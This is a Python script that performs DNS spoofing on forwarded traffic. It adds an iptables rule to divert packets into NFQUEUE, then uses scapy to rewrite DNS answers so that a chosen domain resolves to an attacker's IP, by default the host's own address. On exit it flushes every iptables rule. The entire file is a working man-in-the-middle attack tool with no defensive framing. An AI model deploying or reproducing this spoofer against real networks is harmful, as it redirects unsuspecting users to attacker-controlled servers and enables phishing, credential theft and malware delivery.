#!/usr/bin/env python
from netfilterqueue import NetfilterQueue
import scapy.all as scapy
import subprocess


def iptables(inp):
    if inp == 1:
        subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 1", shell=True)
    elif inp == 3:
        subprocess.call("iptables --flush", shell=True)


def spoof():
    f = open("./dns_spoof.txt", "r")
    contents = f.read()
    target = contents.split(' ')[0]
    ip = contents.split(' ')[1]
    if ip == "default":
        ip = subprocess.check_output("hostname -I", shell=True)
    return target, ip

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        target, ip = spoof()
        if target in str(qname):
            print("[+] Spoofing target")
            print("[+] Checking String: " + target)
            print("[+] Spoofed IP: " + ip)
            answer = scapy.DNSRR(rrname=qname, rdata=ip)
            scapy_packet[scapy.DNS].ancount = 1
            scapy_packet[scapy.DNS].an = answer
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(str(scapy_packet))
    packet.accept()


print("[+] Modifying IP Tables....")
iptables(1)
queue = NetfilterQueue()
print("[+] Waiting for Target...")
try:
    queue.bind(1, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("")
    print("[+] Detected CTRL + C .... Quitting.")
    print("[+] Restoring IP Tables.....")
    iptables(3)
    print("[+] Restoring Complete")


